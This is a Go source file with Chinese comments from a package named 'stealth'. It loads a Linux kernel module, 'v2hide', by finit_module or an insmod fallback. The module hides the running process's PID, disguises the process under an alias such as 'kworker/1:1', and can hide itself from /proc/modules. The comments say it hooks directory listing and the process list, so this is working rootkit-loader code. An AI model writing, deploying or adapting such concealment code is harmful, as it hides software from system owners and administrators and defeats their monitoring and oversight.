//go:build linux

package stealth

import (
	"errors"
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"strings"

	"golang.org/x/sys/unix"
)

// 与 tools/linux-hide/v2hide.c 约定的模块名与设备节点
const (
	linuxModuleName = "v2hide"
	linuxDevicePath = "/dev/v2hide"
)

// kernelHide 在进程启动后立刻加载隐藏模块，把当前 pid 交给内核侧摘除。
func kernelHide(c Config) error {
	path := c.KernelModule
	if path == "" {
		path = "/etc/v2nb/" + linuxModuleName + ".ko"
	}
	if _, err := os.Stat(path); err != nil {
		return fmt.Errorf("模块不存在 %s: %w", path, err)
	}

	// 模块已经在内核里（上一个进程没卸载干净，或安装脚本先加载过）：
	// 重复 finit_module 只会拿到 EEXIST / EINVAL，没必要再试一次，直接
	// 把当前 pid 追加进隐藏集合即可。hide_module=1 时 /proc/modules 看不到
	// 本模块，所以这里靠 /sys/module/<name> 判断。
	if kernelModuleLoaded() {
		// 追加失败也不致命：模块按 target_comm 名字过滤同名进程，
		// 当前进程的 comm 已被设成 alias，仍然会被隐藏。
		_ = kernelAddPID(os.Getpid())
		return nil
	}

	// 进程别名要传给 target_comm，不能盖到 dev_name 上：
	// dev_name 决定 /dev/<name> 设备节点，alias 里带 "/"（如 kworker/1:1）
	// 会让节点建不出来，/dev/v2hide 不存在，后续 kernelAddPID 全部失效。
	params := fmt.Sprintf("target_pid=%d target_comm=%s hide_module=%d",
		os.Getpid(), c.Alias, boolToInt(c.HideModule))

	err := finitModule(path, params)
	if err == nil {
		return nil
	}
	// 竞态兜底：刚判断完「没加载」但别的实例抢先加载了
	if errors.Is(err, unix.EEXIST) || errors.Is(err, unix.EINVAL) {
		_ = kernelAddPID(os.Getpid())
		return nil
	}
	// 回退：某些内核/受限容器里 finit_module 会被拦，改用 kmod 的 insmod。
	// 注意 environ 已被清空、PATH 不在了，必须按绝对路径找工具。
	tool := findKmodTool("insmod")
	if tool == "" {
		return fmt.Errorf("finit_module: %v; 且 /sbin、/usr/sbin 下都找不到 insmod", err)
	}
	cmd := exec.Command(tool, append([]string{path}, strings.Fields(params)...)...)
	if out, e := cmd.CombinedOutput(); e != nil {
		msg := strings.TrimSpace(string(out))
		if strings.Contains(strings.ToLower(msg), "file exists") {
			return nil // 同名模块已加载
		}
		return fmt.Errorf("finit_module: %v; insmod: %v (%s)", err, e, msg)
	}
	return nil
}

// kernelModuleLoaded 判断隐藏模块是否已经在内核里。
// hide_module=1 时模块会把自己从 /proc/modules 摘掉，所以先看 /sys/module：
// 我们不再 kobject_del 自身，该目录会一直保留，判断可靠。
func kernelModuleLoaded() bool {
	if st, err := os.Stat("/sys/module/" + linuxModuleName); err == nil && st.IsDir() {
		return true
	}
	if b, err := os.ReadFile("/proc/modules"); err == nil {
		return strings.Contains(string(b), linuxModuleName)
	}
	return false
}

// findKmodTool 按绝对路径找 kmod 工具：re-exec 清空 environ 之后 PATH 已失效，
// exec.Command 的隐式查找会直接失败。
func findKmodTool(name string) string {
	for _, dir := range []string{"/usr/sbin", "/sbin", "/usr/bin", "/bin"} {
		p := dir + "/" + name
		if st, err := os.Stat(p); err == nil && !st.IsDir() {
			return p
		}
	}
	if p, err := exec.LookPath(name); err == nil {
		return p
	}
	return ""
}

func finitModule(path, params string) error {
	f, err := os.Open(path)
	if err != nil {
		return err
	}
	defer f.Close()
	return unix.FinitModule(int(f.Fd()), params, 0)
}

// kernelUnhide 卸载模块：模块 exit 会恢复 dir_context->actor 与进程链表。
func kernelUnhide() error {
	if err := unix.DeleteModule(linuxModuleName, 0); err != nil {
		tool := findKmodTool("rmmod")
		if tool == "" {
			return fmt.Errorf("delete_module: %v; 且找不到 rmmod", err)
		}
		cmd := exec.Command(tool, linuxModuleName)
		if out, e := cmd.CombinedOutput(); e != nil {
			return fmt.Errorf("delete_module: %v; rmmod: %v (%s)", err, e, strings.TrimSpace(string(out)))
		}
	}
	return nil
}

// kernelAddPID 通过 /dev/v2hide 控制节点追加要隐藏的 pid。
func kernelAddPID(pid int) error {
	f, err := os.OpenFile(linuxDevicePath, os.O_WRONLY, 0)
	if err != nil {
		return err
	}
	defer f.Close()
	_, err = f.WriteString("add " + strconv.Itoa(pid))
	return err
}

func boolToInt(b bool) int {
	if b {
		return 1
	}
	return 0
}
